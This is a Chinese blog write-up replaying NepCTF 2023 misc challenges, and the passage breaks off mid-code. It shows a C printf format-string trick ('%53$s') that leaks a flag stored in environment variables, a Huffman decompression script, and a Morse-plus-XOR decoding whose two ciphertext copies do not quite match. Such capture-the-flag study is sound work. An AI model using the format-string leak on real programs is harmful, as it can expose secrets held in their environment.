@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="阿巴">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/08/20/nepctf2023复现/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Nepctf2023复现misccode本题的flag在环境变量中 #include &lt;stdio.h&gt;  int main() &amp;#123;     char buf[0x8];     printf(&quot;%53$s&quot;); &amp;#125;  用这段代码执行便可。  与AI共舞的哈夫曼下载安装包，给了一个python脚本，和一个bin文件，把脚本丢进chatgpt修改一下，然后运行即可。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nepctf2023复现">
+<meta property="og:url" content="http://example.com/2023/08/20/Nepctf2023%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="阿巴">
+<meta property="og:description" content="Nepctf2023复现misccode本题的flag在环境变量中 #include &lt;stdio.h&gt;  int main() &amp;#123;     char buf[0x8];     printf(&quot;%53$s&quot;); &amp;#125;  用这段代码执行便可。  与AI共舞的哈夫曼下载安装包，给了一个python脚本，和一个bin文件，把脚本丢进chatgpt修改一下，然后运行即可。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/code.png">
+<meta property="og:image" content="d:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E5%93%88%E5%A4%AB%E6%9B%BC.png">
+<meta property="og:image" content="d:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E5%B0%8F%E5%8F%AE%E5%BD%93%E5%BC%B9%E9%92%A2%E7%90%B41.png">
+<meta property="og:image" content="d:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E5%B0%8F%E5%8F%AE%E5%BD%93%E5%BC%B9%E9%92%A2%E7%90%B42.png">
+<meta property="og:image" content="d:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E5%B0%8F%E5%8F%AE%E5%BD%93%E5%BC%B9%E9%92%A2%E7%90%B43.png">
+<meta property="og:image" content="d:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E9%99%8C%E7%94%9F%E7%9A%84%E7%BA%B8%E6%9D%A1.jpg">
+<meta property="og:image" content="d:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E6%96%B0%E6%9C%88%E6%96%87%E5%AD%97.png">
+<meta property="og:image" content="d:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E5%8F%A4%E9%BE%99%E8%AF%AD.png">
+<meta property="og:image" content="http://example.com/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/shro1.png">
+<meta property="og:image" content="http://example.com/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/shro2.png">
+<meta property="og:image" content="http://example.com/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/EZ_include.png">
+<meta property="og:image" content="http://example.com/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/POSt1.png">
+<meta property="og:image" content="http://example.com/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/POST2.png">
+<meta property="article:published_time" content="2023-08-20T01:50:17.000Z">
+<meta property="article:modified_time" content="2023-08-20T01:54:36.845Z">
+<meta property="article:author" content="阿巴">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/code.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/8d.png@1256w_1256h_!web-article-pic.webp" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/8d.png@1256w_1256h_!web-article-pic.webp">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/8d.png@1256w_1256h_!web-article-pic.webp">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Nepctf2023复现 -
+        
+        阿巴
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/e6d1c777bb54674dd5cc6ed2c6147596a899ed7b.jpg@1256w_708h_!web-article-pic.webp","dark":"/images/688bff5fab134b2da7d52ca53163372d39812ec8.jpg@1256w_708h_!web-article-pic.webp"},"title":"阿巴的小站","subtitle":{"text":[],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/621779","instagram":"https://www.instagram.com/","zhihu":"https://www.zhihu.com/people/zhi-chu-85-7","twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.2.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"如果讨厌当前的处境，那就不惜一切代价上去，然后去追随梦想吧！","links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/12/11  12：00：00"};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                阿巴
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                
+                  <h1 class="article-title-regular">Nepctf2023复现</h1>
+                
+              </div>
+              
+                     
+            
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/49871906.jpg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">阿巴</span>
+                            
+                                <span class="author-label">Lv3</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-08-20 09:50:17</span>
+        <span class="mobile">2023-08-20 09:50:17</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-08-20 09:54:36</span>
+            <span class="mobile">2023-08-20 09:54:36</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <span id="more"></span>
+
+
+
+<h1 id="Nepctf2023复现"><a href="#Nepctf2023复现" class="headerlink" title="Nepctf2023复现"></a>Nepctf2023复现</h1><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>本题的flag在环境变量中</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%53$s"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用这段代码执行便可。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="D:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/code.png"
+                     
+                ></p>
+<h3 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h3><p>下载安装包，给了一个python脚本，和一个bin文件，把脚本丢进chatgpt修改一下，然后运行即可。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> heapq
+<span class="token keyword">import</span> os
+ 
+<span class="token keyword">class</span> <span class="token class-name">HuffmanNode</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> char<span class="token punctuation">,</span> freq<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>char <span class="token operator">=</span> char
+        self<span class="token punctuation">.</span>freq <span class="token operator">=</span> freq
+        self<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token boolean">None</span>
+        self<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token boolean">None</span>
+ 
+    <span class="token keyword">def</span> <span class="token function">__lt__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> self<span class="token punctuation">.</span>freq <span class="token operator">&lt;</span> other<span class="token punctuation">.</span>freq
+ 
+<span class="token keyword">def</span> <span class="token function">build_huffman_tree</span><span class="token punctuation">(</span>frequencies<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    heap <span class="token operator">=</span> <span class="token punctuation">[</span>HuffmanNode<span class="token punctuation">(</span>char<span class="token punctuation">,</span> freq<span class="token punctuation">)</span> <span class="token keyword">for</span> char<span class="token punctuation">,</span> freq <span class="token keyword">in</span> frequencies<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+    heapq<span class="token punctuation">.</span>heapify<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>
+ 
+    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
+        left <span class="token operator">=</span> heapq<span class="token punctuation">.</span>heappop<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>
+        right <span class="token operator">=</span> heapq<span class="token punctuation">.</span>heappop<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>
+        merged <span class="token operator">=</span> HuffmanNode<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> left<span class="token punctuation">.</span>freq <span class="token operator">+</span> right<span class="token punctuation">.</span>freq<span class="token punctuation">)</span>
+        merged<span class="token punctuation">.</span>left <span class="token operator">=</span> left
+        merged<span class="token punctuation">.</span>right <span class="token operator">=</span> right
+        heapq<span class="token punctuation">.</span>heappush<span class="token punctuation">(</span>heap<span class="token punctuation">,</span> merged<span class="token punctuation">)</span>
+ 
+    <span class="token keyword">return</span> heap<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+ 
+<span class="token keyword">def</span> <span class="token function">build_huffman_codes</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> current_code<span class="token punctuation">,</span> huffman_codes<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> node <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span>
+ 
+    <span class="token keyword">if</span> node<span class="token punctuation">.</span>char <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+        huffman_codes<span class="token punctuation">[</span>node<span class="token punctuation">.</span>char<span class="token punctuation">]</span> <span class="token operator">=</span> current_code
+        <span class="token keyword">return</span>
+ 
+    build_huffman_codes<span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">,</span> current_code <span class="token operator">+</span> <span class="token string">'0'</span><span class="token punctuation">,</span> huffman_codes<span class="token punctuation">)</span>
+    build_huffman_codes<span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">,</span> current_code <span class="token operator">+</span> <span class="token string">'1'</span><span class="token punctuation">,</span> huffman_codes<span class="token punctuation">)</span>
+ 
+<span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ 
+    frequencies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    <span class="token keyword">for</span> byte <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+        <span class="token keyword">if</span> byte <span class="token keyword">not</span> <span class="token keyword">in</span> frequencies<span class="token punctuation">:</span>
+            frequencies<span class="token punctuation">[</span>byte<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
+        frequencies<span class="token punctuation">[</span>byte<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>
+ 
+    root <span class="token operator">=</span> build_huffman_tree<span class="token punctuation">(</span>frequencies<span class="token punctuation">)</span>
+    huffman_codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    build_huffman_codes<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> huffman_codes<span class="token punctuation">)</span>
+ 
+    compressed_data <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">for</span> byte <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+        compressed_data <span class="token operator">+=</span> huffman_codes<span class="token punctuation">[</span>byte<span class="token punctuation">]</span>
+ 
+    padding <span class="token operator">=</span> <span class="token number">8</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>compressed_data<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span>
+    compressed_data <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token operator">*</span> padding
+ 
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        <span class="token comment"># Write frequency information</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>frequencies<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">for</span> byte<span class="token punctuation">,</span> freq <span class="token keyword">in</span> frequencies<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>byte<span class="token punctuation">,</span> <span class="token punctuation">(</span>freq <span class="token operator">>></span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>freq <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>freq <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> freq <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+ 
+        <span class="token comment"># Write compressed data</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>compressed_data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            byte <span class="token operator">=</span> compressed_data<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span>
+            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>byte<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">decompress</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ 
+    <span class="token comment"># Read frequency information</span>
+    num_symbols <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    frequencies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+    index <span class="token operator">=</span> <span class="token number">1</span>
+    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_symbols<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        byte <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token punctuation">]</span>
+        freq <span class="token operator">=</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>index <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span>index <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> data<span class="token punctuation">[</span>index <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">]</span>
+        frequencies<span class="token punctuation">[</span>byte<span class="token punctuation">]</span> <span class="token operator">=</span> freq
+        index <span class="token operator">+=</span> <span class="token number">5</span>
+ 
+    root <span class="token operator">=</span> build_huffman_tree<span class="token punctuation">(</span>frequencies<span class="token punctuation">)</span>
+ 
+    decoded_data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    current_node <span class="token operator">=</span> root
+    <span class="token keyword">for</span> byte <span class="token keyword">in</span> data<span class="token punctuation">[</span>index<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>bit<span class="token punctuation">)</span> <span class="token keyword">for</span> bit <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>byte<span class="token punctuation">:</span><span class="token format-spec">08b</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> bit <span class="token keyword">in</span> bits<span class="token punctuation">:</span>
+            <span class="token keyword">if</span> bit <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+                current_node <span class="token operator">=</span> current_node<span class="token punctuation">.</span>left
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                current_node <span class="token operator">=</span> current_node<span class="token punctuation">.</span>right
+ 
+            <span class="token keyword">if</span> current_node<span class="token punctuation">.</span>char <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                decoded_data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current_node<span class="token punctuation">.</span>char<span class="token punctuation">)</span>
+                current_node <span class="token operator">=</span> root
+ 
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>decoded_data<span class="token punctuation">)</span><span class="token punctuation">)</span>
+ 
+ 
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    input_file <span class="token operator">=</span> <span class="token string">'input.txt'</span>
+    compressed_file <span class="token operator">=</span> <span class="token string">'compressed.bin'</span>
+    decompressed_file <span class="token operator">=</span> <span class="token string">'decompressed.txt'</span>
+ 
+ 
+    <span class="token comment"># 解压缩文件</span>
+    decompress<span class="token punctuation">(</span>compressed_file<span class="token punctuation">,</span> decompressed_file<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="D:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E5%93%88%E5%A4%AB%E6%9B%BC.png"
+                     
+                ></p>
+<h3 id="小叮当弹钢琴"><a href="#小叮当弹钢琴" class="headerlink" title="小叮当弹钢琴"></a>小叮当弹钢琴</h3><p>下载完之后有一个mid文件。上网搜索打开这个文件的方法，发现是一个音轨文件，找一个在线打开的网站</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="D:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E5%B0%8F%E5%8F%AE%E5%BD%93%E5%BC%B9%E9%92%A2%E7%90%B41.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="D:/Git/blog/myblog/source/images/Nepctf2023%E5%A4%8D%E7%8E%B0/%E5%B0%8F%E5%8F%AE%E5%BD%93%E5%BC%B9%E9%92%A2%E7%90%B42.png"
+                     
+                ></p>
+<p>打开发现一段摩斯密码和一段字符，解码出来为：</p>
+<pre class="line-numbers language-none"><code class="language-none">you should use this toxor something
+0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>异或一下得出答案</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 原始文本和密文</span>
+text <span class="token operator">=</span> <span class="token string">"youshouldusethistoxorsomething"</span>
+ciphertext <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"370a05303c290e045005031c2b1858473a5f052117032c392305005d1e17"</span><span class="token punctuation">)</span>
+ 
+<span class="token comment"># 将文本转换为字节序列</span>
+text_bytes <span class="token operator">=</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ 
+<span class="token comment"># 逐位异或操作并生成解密结果</span>
+decrypted_bytes <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>a <span class="token operator">^</span> b <span class="token keyword">for</span> a<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>text_bytes<span class="token punctuation">,</span> ciphertext<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+ 
+<span class="token comment"># 将解密结果转换为字符串</span>
+decrypted_text <span class="token operator">=</span> decrypted_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ 
